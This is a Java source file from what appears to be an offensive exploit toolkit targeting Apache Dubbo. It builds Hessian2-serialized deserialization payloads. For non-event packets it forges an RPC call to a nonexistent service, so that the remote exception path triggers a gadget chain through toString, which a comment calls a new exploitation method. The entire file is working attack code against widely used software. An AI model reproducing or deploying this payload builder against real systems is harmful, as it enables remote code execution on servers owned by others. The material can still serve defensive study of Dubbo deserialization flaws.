package com.threedr3am.exp.dubbo.serialization.hessian;

import com.caucho.hessian.io.Hessian2Output;
import com.threedr3am.exp.dubbo.payload.PackageType;
import com.threedr3am.exp.dubbo.payload.Payload;
import com.threedr3am.exp.dubbo.serialization.Serialization;
import com.threedr3am.exp.dubbo.support.NoWriteReplaceSerializerFactory;
import java.io.ByteArrayOutputStream;
import java.util.HashMap;
import org.apache.dubbo.common.serialize.Cleanable;
import org.apache.dubbo.common.serialize.Constants;

/**
 * @author threedr3am
 */
public class HessianSerialization implements Serialization {

  private Payload payload;

  @Override
  public byte[] makeData(Payload payload, String[] args, String protocol) {
    ByteArrayOutputStream hessian2ByteArrayOutputStream = new ByteArrayOutputStream();
    Hessian2Output out = new Hessian2Output(hessian2ByteArrayOutputStream);
    NoWriteReplaceSerializerFactory sf = new NoWriteReplaceSerializerFactory();
    sf.setAllowNonSerializable(true);
    out.setSerializerFactory(sf);

    try {
      if (payload.getPackageType() == PackageType.EVENT) {
        out.writeObject(payload.getPayload(args));
      } else {
        //利用service不存在导致抛远程异常时，RpcInvocation执行toString，导致触发gadget toString方法等，新利用方式
        out.writeString("2.0.2");
        out.writeString("com.threedr3am.learn.server.boot.DemoXXXXXXXXXService");
        out.writeString("1.0");
        out.writeString("hello");
        out.writeString("Ljava/util/Map;");
        out.flushBuffer();
        if (out instanceof Cleanable) {
          ((Cleanable) out).cleanup();
        }
        out.writeObject(payload.getPayload(args));
        out.writeObject(new HashMap());

      }
      out.close();
      return hessian2ByteArrayOutputStream.toByteArray();
    } catch (Exception e) {
      e.printStackTrace();
    }

    return new byte[0];
  }

  @Override
  public byte getType() {
    return Constants.HESSIAN2_SERIALIZATION_ID;
  }

  @Override
  public void setPayload(Payload payload) {
    this.payload = payload;
  }

  @Override
  public Payload getPayload() {
    return this.payload;
  }
}
